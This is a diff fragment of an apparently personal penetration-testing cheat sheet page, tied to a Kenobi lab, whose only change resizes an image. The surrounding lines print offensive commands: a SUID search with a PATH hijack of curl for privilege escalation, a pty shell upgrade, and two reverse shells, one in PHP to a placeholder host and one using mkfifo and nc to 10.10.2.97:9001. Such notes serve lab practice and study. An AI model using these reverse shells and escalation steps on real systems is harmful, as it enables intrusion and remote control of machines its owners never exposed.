@@ -7,7 +7,7 @@ find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=
 <span class="nb">chmod </span>777 curl 
 <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
 /usr/bin/menu
-</code></pre></div></div><p><img src="/assets/images/kenobi.png" /></p><h1 id="upgrading-to-a-shell"> Upgrading to a shell <a href="#upgrading-to-a-shell">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn('</span>/bin/bash<span class="s1">')'</span>
+</code></pre></div></div><p><img src="/assets/images/kenobi.png" style="height:200px;width:200px;" /></p><h1 id="upgrading-to-a-shell"> Upgrading to a shell <a href="#upgrading-to-a-shell">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn('</span>/bin/bash<span class="s1">')'</span>
 <span class="nv">SHELL</span><span class="o">=</span>/bin/bash script <span class="nt">-q</span> /dev/null
 </code></pre></div></div><h1 id="reverse-shell"> Reverse Shell <a href="#reverse-shell">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.2.97 9001 <span class="o">&gt;</span>/tmp/f
